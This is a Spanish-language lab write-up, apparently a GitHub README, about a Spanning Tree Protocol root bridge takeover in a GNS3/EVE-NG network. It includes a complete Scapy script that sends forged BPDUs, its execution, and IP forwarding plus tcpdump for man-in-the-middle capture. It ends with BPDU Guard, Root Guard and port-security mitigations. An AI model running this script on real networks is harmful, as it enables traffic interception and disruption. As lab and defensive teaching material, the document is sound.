# STP Root Bridge Attack

## Descripción del Proyecto

Este proyecto documenta la implementación de un ataque al protocolo **Spanning Tree Protocol (STP)** mediante el envío de **BPDUs (Bridge Protocol Data Units) maliciosos**. El objetivo es demostrar cómo un atacante puede manipular la topología de la red y convertirse en el **Root Bridge**, redirigiendo todo el tráfico de la red a través de su dispositivo comprometido.

En este laboratorio, utilicé **Kali Linux** como atacante para enviar tramas BPDU falsificadas con valores de prioridad manipulados, haciendo que los switches legítimos cedan el rol de Root Bridge. Esto me permitió interceptar, analizar y potencialmente modificar el tráfico que atraviesa la red.

---

## Objetivo del Ataque

El ataque STP Root Bridge tiene como finalidad:

✅ **Manipular la elección del Root Bridge** mediante BPDUs con prioridad más baja (valores cercanos a 0)  
✅ **Redirigir el tráfico de la red** hacia el equipo del atacante  
✅ **Posibilitar ataques Man-in-the-Middle (MitM)** al controlar el flujo de datos  
✅ **Generar inestabilidad en la red** forzando recalculaciones constantes del árbol STP  
✅ **Demostrar la falta de protecciones** en switches sin BPDU Guard o Root Guard habilitados  

---

## Topología de Red

Mi topología está compuesta por los siguientes elementos:

```
                    [Router vIOS]
                         |
                    Gi0/0 (Trunk)
                         |
                    [SW-1 Core]
                    /          \ 
              Trunk/            \Trunk
                  /              \
            [SW-2]              [SW-3]
         Access VLAN 10      Access VLAN 20
               |                    |
          [Windows PC]         [Kali Linux]
         (12.0.10.x/24)        (12.0.20.2/24)
```

### Dispositivos y Configuración

| Dispositivo | Interfaz | VLAN | Dirección IP | Rol |
|-------------|----------|------|--------------|-----|
| **Router vIOS** | Gi0/0.10 | 10 | 12.0.10.1/24 | Gateway VLAN 10 |
| **Router vIOS** | Gi0/0.20 | 20 | 12.0.20.1/24 | Gateway VLAN 20 |
| **SW-1** | - | Trunk | - | Switch Core (Root Bridge legítimo) |
| **SW-2** | - | Access VLAN 10 | - | Switch de acceso Windows |
| **SW-3** | - | Access VLAN 20 | - | Switch de acceso Linux |
| **Windows PC** | NIC | 10 | 12.0.10.x/24 (DHCP) | Víctima |
| **Kali Linux** | eth0 | 20 | 12.0.20.2/24 | Atacante |

### Direccionamiento IP

**VLAN 10 (Usuarios Windows):**
- Red: `12.0.10.0/24`
- Gateway: `12.0.10.1`
- DHCP: Configurado en Router vIOS

**VLAN 20 (Usuarios Linux):**
- Red: `12.0.20.0/24`
- Gateway: `12.0.20.1`
- DHCP: Configurado en Router vIOS
- Kali Linux: `12.0.20.2/24` (IP estática)

---

## Requisitos para Ejecutar la Herramienta

### Software Necesario

```bash
# Sistema operativo
Kali Linux 2023.x o superior

# Python 3 y librerías
sudo apt update
sudo apt install python3 python3-pip -y

# Scapy (manipulación de paquetes de red)
sudo pip3 install scapy
```

### Permisos

El script requiere **privilegios de root** para enviar tramas directamente por la interfaz de red:

```bash
sudo python3 stp_attack.py eth0 0 00:00:00:00:00:01
```

---

## Descripción Técnica del Ataque

### ¿Cómo Funciona STP?

El protocolo **Spanning Tree Protocol (STP)** previene loops en redes con enlaces redundantes. Para esto, los switches eligen un **Root Bridge** basándose en:

1. **Bridge ID más bajo** = Prioridad (16 bits) + MAC Address (48 bits)
2. El switch con menor Bridge ID se convierte en Root Bridge
3. Los demás switches calculan sus rutas hacia el Root Bridge

### El Exploit

Mi script envía **BPDUs falsificados** con:

- **Prioridad = 0** (la más baja posible, valor por defecto en Cisco es 32768)
- **MAC Address personalizada** (00:00:00:00:00:01, extremadamente baja)
- **Hello Time = 2 segundos** (frecuencia de envío)

Al recibir estos BPDUs, los switches legítimos detectan un "mejor" Root Bridge y recalculan su topología STP, cediendo el control al atacante.

---

## Código del Script: `stp_attack.py`

El script utiliza **Scapy** para construir y enviar tramas BPDU maliciosas:

```python
#!/usr/bin/env python3

from scapy.all import *
import sys
import time

def stp_root_attack(interface, priority=0, mac_address=None):
    """
    Envía BPDUs maliciosos para convertirse en Root Bridge
    """

    if mac_address is None:
        mac_address = "00:00:00:00:00:01"

    print(f"[*] Iniciando ataque STP Root Bridge en {interface}")
    print(f"[*] Prioridad: {priority}")
    print(f"[*] MAC Address: {mac_address}")
    print("[*] Presiona Ctrl+C para detener\n")

    # Construir BPDU malicioso
    bpdu = Dot3(dst="01:80:c2:00:00:00", src=mac_address) / \
           LLC(dsap=0x42, ssap=0x42, ctrl=0x03) / \
           STP(proto=0, version=0, bpdutype=0,
               rootid=priority,
               rootmac=mac_address,
               bridgeid=priority,
               bridgemac=mac_address,
               portid=0x8001,
               age=1,
               maxage=20,
               hellotime=2,
               fwddelay=15)

    try:
        while True:
            sendp(bpdu, iface=interface, verbose=False)
            print(f"[+] BPDU enviado - Root ID: {priority} | MAC: {mac_address}")
            time.sleep(2)

    except KeyboardInterrupt:
        print("\n[!] Ataque detenido")
        sys.exit(0)

if __name__ == "__main__":

    if len(sys.argv) < 2:
        print("Uso: python3 stp_attack.py <interfaz> [prioridad] [mac]")
        print("Ejemplo: python3 stp_attack.py eth0 0 00:00:00:00:00:01")
        sys.exit(1)

    iface = sys.argv[1]
    prio = int(sys.argv[2]) if len(sys.argv) > 2 else 0
    mac = sys.argv[3] if len(sys.argv) > 3 else None

    stp_root_attack(iface, prio, mac)
```

---

## Parámetros del Script

### Sintaxis

```bash
sudo python3 stp_attack.py <interfaz> [prioridad] [mac_address]
```

### Ejemplo Real Utilizado

```bash
sudo python3 stp_attack.py eth0 0 00:00:00:00:00:01
```

### Explicación de Parámetros

| Parámetro | Valor | Descripción |
|-----------|-------|-------------|
| `eth0` | Interfaz de red | Interfaz de Kali Linux conectada a VLAN 20 |
| `0` | Prioridad del Bridge ID | Valor más bajo posible (mayor prioridad) |
| `00:00:00:00:00:01` | MAC Address | MAC Address falsificada extremadamente baja |

**Nota:** Si no especificas prioridad y MAC, el script usa valores predeterminados (0 y 00:00:00:00:00:01).

---

## Ejecución Paso a Paso

### 1️⃣ Verificar el Estado Inicial de STP

Antes del ataque, revisé el estado de STP en el switch core (SW-1):

```bash
SW-1# show spanning-tree

VLAN0010
  Spanning tree enabled protocol ieee
  Root ID    Priority    32778
             Address     5e00.0001.0000  # MAC del SW-1 (Root Bridge legítimo)
             This bridge is the root
             Hello Time   2 sec  Max Age 20 sec  Forward Delay 15 sec

  Bridge ID  Priority    32778  (priority 32768 sys-id-ext 10)
             Address     5e00.0001.0000
             Hello Time   2 sec  Max Age 20 sec  Forward Delay 15 sec
```

✅ **SW-1 es el Root Bridge legítimo** con prioridad 32768.

---

### 2️⃣ Preparar Kali Linux

En mi equipo Kali, verifiqué la conectividad:

```bash
┌──(root㉿kali)-[/home/kali/stp-attack]
└─# ip addr show eth0
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:0c:29:3a:5f:12 brd ff:ff:ff:ff:ff:ff
    inet 12.0.20.2/24 brd 12.0.20.255 scope global eth0

┌──(root㉿kali)-[/home/kali/stp-attack]
└─# ping -c 2 12.0.20.1
PING 12.0.20.1 (12.0.20.1) 56(84) bytes of data.
64 bytes from 12.0.20.1: icmp_seq=1 ttl=255 time=3.21 ms
64 bytes from 12.0.20.1: icmp_seq=2 ttl=255 time=2.87 ms
```

✅ Conexión a la red confirmada.

---

### 3️⃣ Ejecutar el Ataque

Lancé el script con los parámetros correspondientes:

```bash
┌──(root㉿kali)-[/home/kali/stp-attack]
└─# python3 stp_attack.py eth0 0 00:00:00:00:00:01

[*] Iniciando ataque STP Root Bridge en eth0
[*] Prioridad: 0
[*] MAC Address: 00:00:00:00:00:01
[*] Presiona Ctrl+C para detener

[+] BPDU enviado - Root ID: 0 | MAC: 00:00:00:00:00:01
[+] BPDU enviado - Root ID: 0 | MAC: 00:00:00:00:00:01
[+] BPDU enviado - Root ID: 0 | MAC: 00:00:00:00:00:01
[+] BPDU enviado - Root ID: 0 | MAC: 00:00:00:00:00:01
...
```

![Captura: Ejecución del script en Kali Linux mostrando BPDUs enviados]

---

### 4️⃣ Observar el Cambio en los Switches

Inmediatamente después, verifiqué el estado de STP en SW-1:

```bash
SW-1# show spanning-tree

VLAN0010
  Spanning tree enabled protocol ieee
  Root ID    Priority    0
             Address     0000.0000.0001  # ¡El atacante es ahora Root Bridge!
             Cost        4
             Port        1 (GigabitEthernet0/1)
             Hello Time   2 sec  Max Age 20 sec  Forward Delay 15 sec

  Bridge ID  Priority    32778  (priority 32768 sys-id-ext 10)
             Address     5e00.0001.0000
             Hello Time   2 sec  Max Age 20 sec  Forward Delay 15 sec
```

🚨 **¡El ataque fue exitoso!** El Root Bridge cambió a `0000.0000.0001` (Kali Linux).

---

### 5️⃣ Validar la Topología

También ejecuté:

```bash
SW-1# show spanning-tree root

                                        Root    Hello Max Fwd
Vlan                   Root ID          Cost    Time  Age Dly  Root Port
---------------- -------------------- --------- ----- --- ---  ------------
VLAN0010         0        0000.0000.0001       4      2   20  15  Gi0/1
VLAN0020         0        0000.0000.0001       4      2   20  15  Gi0/1
```

Ahora **todos los switches** consideran a `0000.0000.0001` como Root Bridge.

![Captura: Salida de 'show spanning-tree root' mostrando el cambio]

---

### 6️⃣ Capturar Tráfico (Man-in-the-Middle)

Con el ataque activo, habilité el reenvío de paquetes en Kali para actuar como intermediario:

```bash
┌──(root㉿kali)-[/home/kali/stp-attack]
└─# echo 1 > /proc/sys/net/ipv4/ip_forward

┌──(root㉿kali)-[/home/kali/stp-attack]
└─# tcpdump -i eth0 -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
14:32:11.234567 IP 12.0.10.5 > 12.0.20.1: ICMP echo request, id 1, seq 1, length 64
14:32:11.234789 IP 12.0.20.1 > 12.0.10.5: ICMP echo reply, id 1, seq 1, length 64
```

✅ Pude interceptar tráfico entre VLANs que pasa ahora a través de mi dispositivo.

![Captura: Wireshark mostrando tráfico interceptado]

---

### 7️⃣ Detener el Ataque

Para finalizar, presioné `Ctrl+C`:

```bash
^C
[!] Ataque detenido
```

Los switches recalcularon automáticamente el árbol STP y el Root Bridge legítimo retomó el control.

---

## Qué se Observa en los Switches

### Durante el Ataque

```bash
SW-1# show spanning-tree inconsistentports

Name                 Interface              Inconsistency
-------------------- ---------------------- ------------------
VLAN0010             Gi0/1                  Root Inconsistent

SW-1# show log
%SPANTREE-2-ROOTCHANGE: Root bridge changed for VLAN 10
```

### Comandos de Verificación Útiles

```bash
# Ver estado completo de STP
show spanning-tree

# Ver el Root Bridge actual
show spanning-tree root

# Ver prioridad y Bridge ID
show spanning-tree bridge

# Ver puertos bloqueados/forwarding
show spanning-tree interface gigabitEthernet 0/1

# Ver logs de cambios de topología
show logging | include SPANTREE
```

---

## Impacto del Ataque

### Consecuencias Técnicas

🔴 **Redirección de tráfico:** Todo el tráfico de la red pasa por el atacante  
🔴 **Man-in-the-Middle:** Posibilidad de interceptar, modificar o bloquear comunicaciones  
🔴 **Degradación del rendimiento:** El atacante puede no tener capacidad de switching adecuada  
🔴 **Inestabilidad en la red:** Recalculaciones constantes de STP generan interrupciones  
🔴 **Pérdida de paquetes:** Durante la convergencia de STP, algunos paquetes se pierden  

### Escenarios de Explotación

1. **Captura de credenciales:** Protocolos sin cifrado (HTTP, FTP, Telnet)
2. **Inyección de paquetes:** Modificar respuestas DNS o HTTP
3. **Denegación de servicio:** Bloquear tráfico crítico
4. **Escalamiento de privilegios:** Obtener información sensible para ataques posteriores

---

## Medidas de Mitigación

### 1️⃣ BPDU Guard

Desactiva automáticamente puertos que reciben BPDUs en interfaces de acceso:

```cisco
SW-3(config)# interface gigabitEthernet 0/2
SW-3(config-if)# spanning-tree bpduguard enable
SW-3(config-if)# exit

! O habilitarlo globalmente en todos los puertos PortFast
SW-3(config)# spanning-tree portfast bpduguard default
```

**Efecto:** Si Kali envía BPDUs, el puerto se coloca en `err-disabled`.

---

### 2️⃣ Root Guard

Impide que un puerto reciba BPDUs que intenten convertirse en Root Bridge:

```cisco
SW-1(config)# interface range gigabitEthernet 0/2 - 3
SW-1(config-if-range)# spanning-tree guard root
SW-1(config-if-range)# exit
```

**Efecto:** Si se reciben BPDUs superiores, el puerto entra en estado `root-inconsistent`.

---

### 3️⃣ PortFast y BPDU Filter

Configura puertos de acceso para que no participen en STP:

```cisco
SW-3(config)# interface gigabitEthernet 0/2
SW-3(config-if)# spanning-tree portfast
SW-3(config-if)# spanning-tree bpdufilter enable
SW-3(config-if)# exit
```

⚠️ **Advertencia:** Usar con cuidado, ya que elimina la protección STP.

---

### 4️⃣ Establecer Prioridad del Root Bridge

Asegurar que el switch core siempre sea el Root Bridge:

```cisco
SW-1(config)# spanning-tree vlan 10,20 priority 4096
SW-1(config)# spanning-tree vlan 10,20 root primary
```

**Efecto:** Incluso si el atacante envía prioridad 0, combinar con Root Guard lo bloquea.

---

### 5️⃣ Port Security

Limita las MAC addresses permitidas en cada puerto:

```cisco
SW-3(config)# interface gigabitEthernet 0/2
SW-3(config-if)# switchport mode access
SW-3(config-if)# switchport port-security
SW-3(config-if)# switchport port-security maximum 2
SW-3(config-if)# switchport port-security violation shutdown
SW-3(config-if)# switchport port-security mac-address sticky
SW-3(config-if)# exit
```

---

### 6️⃣ Monitoreo y Alertas

Configurar logging y SNMP para detectar cambios en STP:

```cisco
SW-1(config)# logging buffered 16384 informational
SW-1(config)# logging console warnings
SW-1(config)# logging trap notifications
SW-1(config)# logging host 12.0.20.100
```

---

## Configuración Completa de Mitigación

### Switch Core (SW-1)

```cisco
! Establecer como Root Bridge permanente
spanning-tree vlan 10,20 root primary
spanning-tree vlan 10,20 priority 4096

! Aplicar Root Guard en puertos hacia switches de acceso
interface range gigabitEthernet 0/2 - 3
 spanning-tree guard root
 exit

! Logging
logging buffered informational
```

### Switches de Acceso (SW-2, SW-3)

```cisco
! Habilitar BPDU Guard globalmente
spanning-tree portfast bpduguard default

! Configurar puertos de acceso
interface gigabitEthernet 0/2
 switchport mode access
 switchport access vlan 20
 spanning-tree portfast
 spanning-tree bpduguard enable
 switchport port-security
 switchport port-security maximum 2
 switchport port-security violation shutdown
 switchport port-security mac-address sticky
 exit
```

---

## Capturas de Pantalla Sugeridas

📸 **Incluir las siguientes capturas en el repositorio:**

1. **`01-topologia.png`**: Diagrama de la topología en GNS3/EVE-NG
2. **`02-stp-antes.png`**: Salida de `show spanning-tree` antes del ataque
3. **`03-ejecucion-script.png`**: Terminal de Kali ejecutando `stp_attack.py`
4. **`04-stp-despues.png`**: Salida mostrando el nuevo Root Bridge (Kali)
5. **`05-wireshark-bpdu.png`**: Wireshark capturando tramas BPDU maliciosas
6. **`06-trafico-interceptado.png`**: tcpdump/Wireshark mostrando tráfico redirigido
7. **`07-bpdu-guard.png`**: Puerto en `err-disabled` tras activar BPDU Guard
8. **`08-root-guard.png`**: Salida de `show spanning-tree inconsistentports`

---

## Conclusión

En este laboratorio demostré cómo un atacante con acceso a la red puede manipular el protocolo **Spanning Tree Protocol (STP)** mediante el envío de BPDUs falsificados. Al establecerme como Root Bridge con una prioridad de 0 y una MAC Address extremadamente baja, logré que los switches legítimos redirigieran todo el tráfico hacia mi equipo Kali Linux.

Este ataque es particularmente peligroso porque:

✅ **No requiere credenciales:** Solo necesitas estar conectado físicamente o por Wi-Fi  
✅ **Es silencioso:** Sin protecciones adecuadas, puede pasar desapercibido  
✅ **Permite Man-in-the-Middle:** Interceptar, modificar o bloquear tráfico  
✅ **Afecta a toda la red:** No solo a una VLAN específica  

Sin embargo, la implementación de **BPDU Guard**, **Root Guard** y **Port Security** puede prevenir completamente este tipo de ataques. En mi laboratorio, configuré estas protecciones y verifiqué que, al intentar enviar BPDUs maliciosos, el puerto se deshabilitaba automáticamente, bloqueando el ataque.

Este ejercicio refuerza la importancia de **no confiar ciegamente en los protocolos de capa 2** y de aplicar las mejores prácticas de seguridad en switches de producción. Las redes modernas deben asumir que un atacante puede estar conectado físicamente y prepararse con controles preventivos, detectivos y correctivos.

---

## Recursos Adicionales

📚 **Referencias técnicas:**

- [Cisco STP Best Practices](https://www.cisco.com/c/en/us/support/docs/lan-switching/spanning-tree-protocol/5234-5.html)
- [Scapy Documentation](https://scapy.readthedocs.io/)
- [IEEE 802.1D Spanning Tree Protocol](https://standards.ieee.org/standard/802_1D-2004.html)

📌 **Proyectos relacionados:**

- DHCP Starvation Attack
- DHCP Rogue Server Attack
- VLAN Hopping Attack

---

## Licencia

Este proyecto tiene fines **exclusivamente educativos**. El uso indebido de estas técnicas en redes sin autorización es **ilegal** y puede resultar en sanciones penales. Asegúrate de contar con permisos explícitos antes de realizar pruebas de penetración.

---

**Desarrollado por:** mariana121319  
**Fecha:** Febrero 2026  
**Entorno:** GNS3/EVE-NG con vIOS y Kali Linux